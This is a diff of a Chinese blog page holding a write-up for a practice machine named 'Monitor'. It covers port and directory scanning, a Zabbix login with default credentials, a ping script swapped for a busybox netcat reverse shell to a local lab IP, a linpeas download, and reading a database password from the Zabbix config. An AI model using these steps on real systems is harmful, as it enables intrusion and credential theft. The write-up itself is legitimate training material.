@@ -635,7 +635,7 @@ flag{user-ab0e0561b1a833a6141ad2273744543c}
 <meta property="og:url" content="https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9A%20Monitor%2020250810.html">
 <meta property="og:image" content="https://raw.githubusercontent.com/pingsag3/blog_img/main/images/Nazha.jpg">
 <title>群友靶机： Monitor 20250810</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -706,89 +706,85 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 https://maze-sec.com/library
 https://hackmyvm.eu/machines/machine.php?vm=
 </code></pre>
-<pre lang="shell" class="notranslate"><code class="notranslate">难度：⭐️
-知识点：信息收集，目录扫描，`zabbix`,`mount`提权
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️
+知识点：信息收集，目录扫描，<span class="pl-s"><span class="pl-pds">`</span>zabbix<span class="pl-pds">`</span></span>,<span class="pl-s"><span class="pl-pds">`</span>mount<span class="pl-pds">`</span></span>提权</pre></div>
 <h3>2. 信息收集</h3>
 <h5>Nmap</h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# arp-scan -l | grep PCS
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
 192.168.31.173  08:00:27:6e:98:21       PCS Systemtechnik GmbH
-└─# IP=192.168.31.173
-└─# nmap -sV -sC -A $IP -Pn
+└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.31.173</span>
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 15:10 CST
-Nmap scan report for Monitor (192.168.31.173)
+Nmap scan report <span class="pl-k">for</span> Monitor (192.168.31.173)
 Host is up (0.0015s latency).
 Not shown: 996 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
-| ssh-hostkey:
-|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
-|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
-|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
-80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
-|_http-server-header: Apache/2.4.62 (Debian)
-|_http-title: \xE7\x9B\x91\xE6\x8E\xA7\xE7\xB3\xBB\xE7\xBB\x9F\xE7\x99\xBB\xE5\xBD\x95
-111/tcp  open  rpcbind 2-4 (RPC #100000)
-| rpcinfo:
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  3,4          111/tcp6  rpcbind
-|   100000  3,4          111/udp6  rpcbind
-|   100003  3           2049/udp   nfs
-|   100003  3           2049/udp6  nfs
-|   100003  3,4         2049/tcp   nfs
-|   100003  3,4         2049/tcp6  nfs
-|   100005  1,2,3      34153/udp   mountd
-|   100005  1,2,3      36123/tcp6  mountd
-|   100005  1,2,3      39525/udp6  mountd
-|   100005  1,2,3      59255/tcp   mountd
-|   100021  1,3,4      36401/tcp6  nlockmgr
-|   100021  1,3,4      36810/udp   nlockmgr
-|   100021  1,3,4      41238/udp6  nlockmgr
-|   100021  1,3,4      45199/tcp   nlockmgr
-|   100227  3           2049/tcp   nfs_acl
-|   100227  3           2049/tcp6  nfs_acl
-|   100227  3           2049/udp   nfs_acl
-|_  100227  3           2049/udp6  nfs_acl
-2049/tcp open  nfs     3-4 (RPC #100003)
-MAC Address: 08:00:27:6E:98:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
-</code></pre>
+<span class="pl-k">|</span> ssh-hostkey:
+<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80/tcp   open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
+<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Debian)
+<span class="pl-k">|</span>_http-title: <span class="pl-cce">\x</span>E7<span class="pl-cce">\x</span>9B<span class="pl-cce">\x</span>91<span class="pl-cce">\x</span>E6<span class="pl-cce">\x</span>8E<span class="pl-cce">\x</span>A7<span class="pl-cce">\x</span>E7<span class="pl-cce">\x</span>B3<span class="pl-cce">\x</span>BB<span class="pl-cce">\x</span>E7<span class="pl-cce">\x</span>BB<span class="pl-cce">\x</span>9F<span class="pl-cce">\x</span>E7<span class="pl-cce">\x</span>99<span class="pl-cce">\x</span>BB<span class="pl-cce">\x</span>E5<span class="pl-cce">\x</span>BD<span class="pl-cce">\x</span>95
+111/tcp  open  rpcbind 2-4 (RPC <span class="pl-c"><span class="pl-c">#</span>100000)</span>
+<span class="pl-k">|</span> rpcinfo:
+<span class="pl-k">|</span>   program version    port/proto  service
+<span class="pl-k">|</span>   100000  2,3,4        111/tcp   rpcbind
+<span class="pl-k">|</span>   100000  2,3,4        111/udp   rpcbind
+<span class="pl-k">|</span>   100000  3,4          111/tcp6  rpcbind
+<span class="pl-k">|</span>   100000  3,4          111/udp6  rpcbind
+<span class="pl-k">|</span>   100003  3           2049/udp   nfs
+<span class="pl-k">|</span>   100003  3           2049/udp6  nfs
+<span class="pl-k">|</span>   100003  3,4         2049/tcp   nfs
+<span class="pl-k">|</span>   100003  3,4         2049/tcp6  nfs
+<span class="pl-k">|</span>   100005  1,2,3      34153/udp   mountd
+<span class="pl-k">|</span>   100005  1,2,3      36123/tcp6  mountd
+<span class="pl-k">|</span>   100005  1,2,3      39525/udp6  mountd
+<span class="pl-k">|</span>   100005  1,2,3      59255/tcp   mountd
+<span class="pl-k">|</span>   100021  1,3,4      36401/tcp6  nlockmgr
+<span class="pl-k">|</span>   100021  1,3,4      36810/udp   nlockmgr
+<span class="pl-k">|</span>   100021  1,3,4      41238/udp6  nlockmgr
+<span class="pl-k">|</span>   100021  1,3,4      45199/tcp   nlockmgr
+<span class="pl-k">|</span>   100227  3           2049/tcp   nfs_acl
+<span class="pl-k">|</span>   100227  3           2049/tcp6  nfs_acl
+<span class="pl-k">|</span>   100227  3           2049/udp   nfs_acl
+<span class="pl-k">|</span>_  100227  3           2049/udp6  nfs_acl
+2049/tcp open  nfs     3-4 (RPC <span class="pl-c"><span class="pl-c">#</span>100003)</span>
+MAC Address: 08:00:27:6E:98:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</pre></div>
 <p>开放了<code class="notranslate">22、80、RPC</code>端口,没rpc利用工具，先常规扫一下目录</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak
-└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
-[15:12:43] 302 -    0B  - /dashboard.php  -&gt;  index.php
-[15:12:47] 302 -    0B  - /logout.php  -&gt;  index.php
-[15:12:55] 301 -  317B  - /upload  -&gt;  http://192.168.31.173/upload/
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html,.bak</span>
+└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP  -x 403 -e txt,php,html</span>
+[15:12:43] 302 -    0B  - /dashboard.php  -<span class="pl-k">&gt;</span>  index.php
+[15:12:47] 302 -    0B  - /logout.php  -<span class="pl-k">&gt;</span>  index.php
+[15:12:55] 301 -  317B  - /upload  -<span class="pl-k">&gt;</span>  http://192.168.31.173/upload/
 [15:12:55] 200 -  407B  - /upload/
 [15:12:57] 200 -    1KB - /zabbix/
-└─# dirsearch -u http://$IP/zabbix/  -x 403 -e txt,php,html
+└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP/zabbix/  -x 403 -e txt,php,html</span>
 [15:38:01] Starting: zabbix/
-[15:38:07] 301 -  324B  - /zabbix/assets  -&gt;  http://192.168.31.173/zabbix/assets/
-[15:38:08] 301 -  323B  - /zabbix/audio  -&gt;  http://192.168.31.173/zabbix/audio/
+[15:38:07] 301 -  324B  - /zabbix/assets  -<span class="pl-k">&gt;</span>  http://192.168.31.173/zabbix/assets/
+[15:38:08] 301 -  323B  - /zabbix/audio  -<span class="pl-k">&gt;</span>  http://192.168.31.173/zabbix/audio/
 [15:38:09] 200 -  227B  - /zabbix/composer.json
 [15:38:09] 200 -    8KB - /zabbix/composer.lock
-[15:38:10] 301 -  322B  - /zabbix/data  -&gt;  http://192.168.31.173/zabbix/data/
+[15:38:10] 301 -  322B  - /zabbix/data  -<span class="pl-k">&gt;</span>  http://192.168.31.173/zabbix/data/
 [15:38:11] 200 -   32KB - /zabbix/favicon.ico
-[15:38:11] 301 -  323B  - /zabbix/fonts  -&gt;  http://192.168.31.173/zabbix/fonts/
+[15:38:11] 301 -  323B  - /zabbix/fonts  -<span class="pl-k">&gt;</span>  http://192.168.31.173/zabbix/fonts/
 [15:38:12] 200 -  819B  - /zabbix/image.php
-[15:38:13] 301 -  320B  - /zabbix/js  -&gt;  http://192.168.31.173/zabbix/js/
+[15:38:13] 301 -  320B  - /zabbix/js  -<span class="pl-k">&gt;</span>  http://192.168.31.173/zabbix/js/
 [15:38:14] 200 -  823B  - /zabbix/maintenance.php
 [15:38:14] 200 -  819B  - /zabbix/map.php
-[15:38:15] 301 -  325B  - /zabbix/modules  -&gt;  http://192.168.31.173/zabbix/modules/
+[15:38:15] 301 -  325B  - /zabbix/modules  -<span class="pl-k">&gt;</span>  http://192.168.31.173/zabbix/modules/
 [15:38:18] 200 -  514B  - /zabbix/robots.txt
 [15:38:18] 200 -  822B  - /zabbix/setup.php
-[15:38:23] 200 -  849B  - /zabbix/zabbix.php?action=dashboard.view&amp;dashboardid=1
-</code></pre>
+[15:38:23] 200 -  849B  - /zabbix/zabbix.php<span class="pl-k">?</span>action=dashboard.view<span class="pl-k">&amp;</span>dashboardid=1</pre></div>
 <p>​    访问子目录<code class="notranslate">zabbix</code>，有个登陆页面<code class="notranslate">/zabbix/index.php</code>，顺手搜索<code class="notranslate">Zabbix</code>的默认账号为“<code class="notranslate">Admin</code>”，密码为“<code class="notranslate">zabbix</code>”，使用默认密码成功登录管理后台，显示版本信息<code class="notranslate">Zabbix 6.0.40</code></p>
 <h3>3.获得<code class="notranslate">zabbix</code>权限</h3>
 <p>登录后在页面的<code class="notranslate">Administration</code>--&gt; <code class="notranslate">Scripts</code>发现可以添加脚本， 没看到新增，将现有的<code class="notranslate">ping</code>脚本内容修改为反弹<code class="notranslate">shell</code>内容</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">#http://192.168.31.173/zabbix/zabbix.php?action=script.edit&amp;scriptid=1
-#ping_bak
-ping -c 3 {HOST.CONN}; case $? in [01]) true;; *) false;; esac
-#修改为
-busybox nc 192.168.31.126 1234 -e /bin/bash
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>http://192.168.31.173/zabbix/zabbix.php?action=script.edit&amp;scriptid=1</span>
+<span class="pl-c"><span class="pl-c">#</span>ping_bak</span>
+ping -c 3 {HOST.CONN}<span class="pl-k">;</span> <span class="pl-k">case</span> <span class="pl-smi">$?</span> <span class="pl-k">in</span> [01]) <span class="pl-c1">true</span>;; <span class="pl-k">*</span>) <span class="pl-c1">false</span>;; <span class="pl-k">esac</span>
+<span class="pl-c"><span class="pl-c">#</span>修改为</span>
+busybox nc 192.168.31.126 1234 -e /bin/bash</pre></div>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2a9ac935f6df5e91ca2cfc4dc396f4e1b9fc63a3180e420a466ac7dabdc7157f/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303831303138313130303939392e706e67"><img src="https://camo.githubusercontent.com/2a9ac935f6df5e91ca2cfc4dc396f4e1b9fc63a3180e420a466ac7dabdc7157f/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303831303138313130303939392e706e67" alt="image-20250810181100999" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250810181100999.png" style="max-width: 100%;"></a></p>
 <p>更新脚本内容后，再去<code class="notranslate">Monitoring</code>--&gt; <code class="notranslate">Maps</code>位置点击主机名执行反弹shell命令，即可获得<code class="notranslate">zabbix</code>的shell</p>
 <pre class="notranslate"><code class="notranslate">└─# nc -lvp 1234
@@ -800,7 +796,7 @@ uid=107(zabbix) gid=114(zabbix) groups=114(zabbix)
 </code></pre>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/01a2d2f491bf81f957903ad604b55201b6338b57389df207a3f39422e96f1d12/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303831303138313334343238392e706e67"><img src="https://camo.githubusercontent.com/01a2d2f491bf81f957903ad604b55201b6338b57389df207a3f39422e96f1d12/68747470733a2f2f67697465652e636f6d2f736875693636362f696d616765732f7261772f6d61737465722f696d616765732f696d6167652d32303235303831303138313334343238392e706e67" alt="image-20250810181344289" data-canonical-src="https://gitee.com/shui666/images/raw/master/images/image-20250810181344289.png" style="max-width: 100%;"></a></p>
 <p>可登录账户有<code class="notranslate">hyh</code>，此时可以读取<code class="notranslate">user.txt</code>,注意此时<code class="notranslate">shell</code>过几分钟就会断,赶紧收集信息下一步</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">cat /etc/passwd
+<div class="highlight highlight-source-shell"><pre class="notranslate">cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 .....
 mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
@@ -808,153 +804,144 @@ zabbix:x:107:114::/var/lib/zabbix/:/usr/sbin/nologin
 Debian-snmp:x:108:115::/var/lib/snmp:/bin/false
 hyh:x:1000:1000:,,,:/home/hyh:/bin/bash
 _rpc:x:109:65534::/run/rpcbind:/usr/sbin/nologin
-statd:x:110:65534::/var/lib/nfs:/usr/sbin/nologin
-</code></pre>
+statd:x:110:65534::/var/lib/nfs:/usr/sbin/nologin</pre></div>
 <h5>拿到<code class="notranslate">user.txt</code></h5>
-<pre lang="shell" class="notranslate"><code class="notranslate">zabbix@Monitor:/home/hyh$ ls
+<div class="highlight highlight-source-shell"><pre class="notranslate">zabbix@Monitor:/home/hyh$ ls
 user.txt
 zabbix@Monitor:/home/hyh$ cat user.txt
 flag{user-ab0e0561b1a833a6141ad2273744543c}
 zabbix@Monitor:/home/hyh$ id
-uid=107(zabbix) gid=114(zabbix) groups=114(zabbix)
-</code></pre>
+uid=107(zabbix) gid=114(zabbix) groups=114(zabbix)</pre></div>
 <h3>4.获得<code class="notranslate">hyh</code>权限</h3>
 <p>查看<code class="notranslate">hyh</code>用户和数组相关文件没发现有价值信息，先传个<code class="notranslate">linpeas.sh</code>脚本扫一下</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">zabbix@Monitor:/tmp$ busybox wget 192.168.31.126/linpeas.sh
+<div class="highlight highlight-source-shell"><pre class="notranslate">zabbix@Monitor:/tmp$ busybox wget 192.168.31.126/linpeas.sh
 Connecting to 192.168.31.126 (192.168.31.126:80)
-linpeas.sh           100% |************************************************************************|  808k  0:00:00 ETA
-zabbix@Monitor:/tmp$ bash linpeas.sh
-</code></pre>
+linpeas.sh           100% <span class="pl-k">|</span><span class="pl-k">************************************************************************</span><span class="pl-k">|</span>  808k  0:00:00 ETA
+zabbix@Monitor:/tmp$ bash linpeas.sh</pre></div>
 <p>找到了<code class="notranslate">zabbix</code>配置文件<code class="notranslate">zabbix.conf</code>，里面有数据库等配置信息</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">zabbix@Monitor:/$ cat /etc/zabbix/web/zabbix.conf.php
-&lt;?php
+<div class="highlight highlight-source-shell"><pre class="notranslate">zabbix@Monitor:/$ cat /etc/zabbix/web/zabbix.conf.php
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>php
 // Zabbix GUI configuration file.
 
-$DB['TYPE']                             = 'MYSQL';
-$DB['SERVER']                   = 'localhost';
-$DB['PORT']                             = '0';
-$DB['DATABASE']                 = 'zabbix';
-$DB['USER']                             = 'zabbix';
-$DB['PASSWORD']                 = 'root123';
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>TYPE<span class="pl-pds">'</span></span>]                             = <span class="pl-s"><span class="pl-pds">'</span>MYSQL<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>SERVER<span class="pl-pds">'</span></span>]                   = <span class="pl-s"><span class="pl-pds">'</span>localhost<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>PORT<span class="pl-pds">'</span></span>]                             = <span class="pl-s"><span class="pl-pds">'</span>0<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>DATABASE<span class="pl-pds">'</span></span>]                 = <span class="pl-s"><span class="pl-pds">'</span>zabbix<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>USER<span class="pl-pds">'</span></span>]                             = <span class="pl-s"><span class="pl-pds">'</span>zabbix<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>PASSWORD<span class="pl-pds">'</span></span>]                 = <span class="pl-s"><span class="pl-pds">'</span>root123<span class="pl-pds">'</span></span><span class="pl-k">;</span>
 
-// Schema name. Used for PostgreSQL.
-$DB['SCHEMA']                   = '';
+// Schema name. Used <span class="pl-k">for</span> PostgreSQL.
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>SCHEMA<span class="pl-pds">'</span></span>]                   = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
 
-// Used for TLS connection.
-$DB['ENCRYPTION']               = false;
-$DB['KEY_FILE']                 = '';
-$DB['CERT_FILE']                = '';
-$DB['CA_FILE']                  = '';
-$DB['VERIFY_HOST']              = false;
-$DB['CIPHER_LIST']              = '';
+// Used <span class="pl-k">for</span> TLS connection.
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>ENCRYPTION<span class="pl-pds">'</span></span>]               = <span class="pl-c1">false</span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>KEY_FILE<span class="pl-pds">'</span></span>]                 = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>CERT_FILE<span class="pl-pds">'</span></span>]                = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>CA_FILE<span class="pl-pds">'</span></span>]                  = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>VERIFY_HOST<span class="pl-pds">'</span></span>]              = <span class="pl-c1">false</span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>CIPHER_LIST<span class="pl-pds">'</span></span>]              = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
 
-// Vault configuration. Used if database credentials are stored in Vault secrets manager.
-$DB['VAULT_URL']                = '';
-$DB['VAULT_DB_PATH']    = '';
-$DB['VAULT_TOKEN']              = '';
+// Vault configuration. Used <span class="pl-k">if</span> database credentials are stored <span class="pl-k">in</span> Vault secrets manager.
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>VAULT_URL<span class="pl-pds">'</span></span>]                = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>VAULT_DB_PATH<span class="pl-pds">'</span></span>]    = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>VAULT_TOKEN<span class="pl-pds">'</span></span>]              = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
 
-// Use IEEE754 compatible value range for 64-bit Numeric (float) history values.
-// This option is enabled by default for new Zabbix installations.
-// For upgraded installations, please read database upgrade notes before enabling this option.
-$DB['DOUBLE_IEEE754']   = true;
+// Use IEEE754 compatible value range <span class="pl-k">for</span> 64-bit Numeric (float) <span class="pl-c1">history</span> values.
+// This option is enabled by default <span class="pl-k">for</span> new Zabbix installations.
+// For upgraded installations, please <span class="pl-c1">read</span> database upgrade notes before enabling this option.
+<span class="pl-smi">$DB</span>[<span class="pl-s"><span class="pl-pds">'</span>DOUBLE_IEEE754<span class="pl-pds">'</span></span>]   = <span class="pl-c1">true</span><span class="pl-k">;</span>
 
-// Uncomment and set to desired values to override Zabbix hostname/IP and port.
-// $ZBX_SERVER                  = '';
-// $ZBX_SERVER_PORT             = '';
+// Uncomment and <span class="pl-c1">set</span> to desired values to override Zabbix hostname/IP and port.
+// <span class="pl-smi">$ZBX_SERVER</span>                  = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
+// <span class="pl-smi">$ZBX_SERVER_PORT</span>             = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span><span class="pl-k">;</span>
 
-$ZBX_SERVER_NAME                = 'Zabbix';
+<span class="pl-smi">$ZBX_SERVER_NAME</span>                = <span class="pl-s"><span class="pl-pds">'</span>Zabbix<span class="pl-pds">'</span></span><span class="pl-k">;</span>
 
-$IMAGE_FORMAT_DEFAULT   = IMAGE_FORMAT_PNG;
+<span class="pl-smi">$IMAGE_FORMAT_DEFAULT</span>   = IMAGE_FORMAT_PNG<span class="pl-k">;</span>
 
-// Uncomment this block only if you are using Elasticsearch.
-// Elasticsearch url (can be string if same url is used for all types).
-//$HISTORY['url'] = [
-//      'uint' =&gt; 'http://localhost:9200',
-//      'text' =&gt; 'http://localhost:9200'
-//];
-// Value types stored in Elasticsearch.
-//$HISTORY['types'] = ['uint', 'text'];
+// Uncomment this block only <span class="pl-k">if</span> you are using Elasticsearch.
+// Elasticsearch url (can be string <span class="pl-k">if</span> same url is used <span class="pl-k">for</span> all types).
+//<span class="pl-smi">$HISTORY</span>[<span class="pl-s"><span class="pl-pds">'</span>url<span class="pl-pds">'</span></span>] = [
+//      <span class="pl-s"><span class="pl-pds">'</span>uint<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>http://localhost:9200<span class="pl-pds">'</span></span>,
+//      <span class="pl-s"><span class="pl-pds">'</span>text<span class="pl-pds">'</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>http://localhost:9200<span class="pl-pds">'</span></span>
+//]<span class="pl-k">;</span>
+// Value types stored <span class="pl-k">in</span> Elasticsearch.
+//<span class="pl-smi">$HISTORY</span>[<span class="pl-s"><span class="pl-pds">'</span>types<span class="pl-pds">'</span></span>] = [<span class="pl-s"><span class="pl-pds">'</span>uint<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>text<span class="pl-pds">'</span></span>]<span class="pl-k">;</span>
 
-// Used for SAML authentication.
-// Uncomment to override the default paths to SP private key, SP and IdP X.509 certificates, and to set extra settings.
-//$SSO['SP_KEY']                        = 'conf/certs/sp.key';
-//$SSO['SP_CERT']                       = 'conf/certs/sp.crt';
-//$SSO['IDP_CERT']              = 'conf/certs/idp.crt';
-//$SSO['SETTINGS']              = [];
-zabbix@Monitor:/$
-</code></pre>
+// Used <span class="pl-k">for</span> SAML authentication.
+// Uncomment to override the default paths to SP private key, SP and IdP X.509 certificates, and to <span class="pl-c1">set</span> extra settings.
+//<span class="pl-smi">$SSO</span>[<span class="pl-s"><span class="pl-pds">'</span>SP_KEY<span class="pl-pds">'</span></span>]                        = <span class="pl-s"><span class="pl-pds">'</span>conf/certs/sp.key<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+//<span class="pl-smi">$SSO</span>[<span class="pl-s"><span class="pl-pds">'</span>SP_CERT<span class="pl-pds">'</span></span>]                       = <span class="pl-s"><span class="pl-pds">'</span>conf/certs/sp.crt<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+//<span class="pl-smi">$SSO</span>[<span class="pl-s"><span class="pl-pds">'</span>IDP_CERT<span class="pl-pds">'</span></span>]              = <span class="pl-s"><span class="pl-pds">'</span>conf/certs/idp.crt<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+//<span class="pl-smi">$SSO</span>[<span class="pl-s"><span class="pl-pds">'</span>SETTINGS<span class="pl-pds">'</span></span>]              = []<span class="pl-k">;</span>
+zabbix@Monitor:/$</pre></div>
 <p>本机起了<code class="notranslate">mysql</code>，既然有数据账户密码，先登陆数据库查一下，<code class="notranslate">users</code>表中只有<code class="notranslate">Admin</code>和<code class="notranslate">guest</code>的账户信息</p>
-<pre lang="shell" class="notranslate"><code class="notranslate">zabbix@Monitor:/$ mysql -u zabbix -proot123 -D zabbix
-Reading table information for completion of table and column names
+<div class="highlight highlight-source-shell"><pre class="notranslate">zabbix@Monitor:/$ mysql -u zabbix -proot123 -D zabbix
+Reading table information <span class="pl-k">for</span> completion of table and column names
 You can turn off this feature to get a quicker startup with -A
 
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Welcome to the MariaDB monitor.  Commands end with <span class="pl-k">;</span> or <span class="pl-cce">\g</span>.
 Your MariaDB connection id is 2131
 Server version: 10.5.23-MariaDB-0+deb11u1 Debian 11
 
 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+Type <span class="pl-s"><span class="pl-pds">'</span>help;<span class="pl-pds">'</span></span> or <span class="pl-s"><span class="pl-pds">'</span>\h<span class="pl-pds">'</span></span> <span class="pl-k">for</span> help. Type <span class="pl-s"><span class="pl-pds">'</span>\c<span class="pl-pds">'</span></span> to clear the current input statement.
 
-MariaDB [zabbix]&gt; show tables;
+MariaDB [zabbix]<span class="pl-k">&gt;</span> show tables<span class="pl-k">;</span>
 +----------------------------+
-| Tables_in_zabbix           |
+<span class="pl-k">|</span> Tables_in_zabbix           <span class="pl-k">|</span>
 +----------------------------+
 ......
-| triggers                   |
-| users                      |
-| users_groups               |
-| usrgrp                     |
-| valuemap                   |
-| valuemap_mapping           |
-| widget                     |
-| widget_field               |
+<span class="pl-k">|</span> triggers                   <span class="pl-k">|</span>
+<span class="pl-k">|</span> users                      <span class="pl-k">|</span>
+<span class="pl-k">|</span> users_groups               <span class="pl-k">|</span>
+<span class="pl-k">|</span> usrgrp                     <span class="pl-k">|</span>
+<span class="pl-k">|</span> valuemap                   <span class="pl-k">|</span>
+<span class="pl-k">|</span> valuemap_mapping           <span class="pl-k">|</span>
+<span class="pl-k">|</span> widget                     <span class="pl-k">|</span>
+<span class="pl-k">|</span> widget_field               <span class="pl-k">|</span>
 +----------------------------+
-173 rows in set (0.001 sec)
+173 rows <span class="pl-k">in</span> <span class="pl-c1">set</span> (0.001 sec)
 
-MariaDB [zabbix]&gt; select * from users;
+MariaDB [zabbix]<span class="pl-k">&gt;</span> <span class="pl-k">select</span> <span class="pl-smi">*</span> from users<span class="pl-k">;</span>
 +--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+
-| userid | username | name   | surname       | passwd                                                       | url | autologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | timezone | roleid |
+<span class="pl-k">|</span> userid <span class="pl-k">|</span> username <span class="pl-k">|</span> name   <span class="pl-k">|</span> surname       <span class="pl-k">|</span> passwd                                                       <span class="pl-k">|</span> url <span class="pl-k">|</span> autologin <span class="pl-k">|</span> autologout <span class="pl-k">|</span> lang    <span class="pl-k">|</span> refresh <span class="pl-k">|</span> theme   <span class="pl-k">|</span> attempt_failed <span class="pl-k">|</span> attempt_ip <span class="pl-k">|</span> attempt_clock <span class="pl-k">|</span> rows_per_page <span class="pl-k">|</span> timezone <span class="pl-k">|</span> roleid <span class="pl-k">|</span>
 +--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+
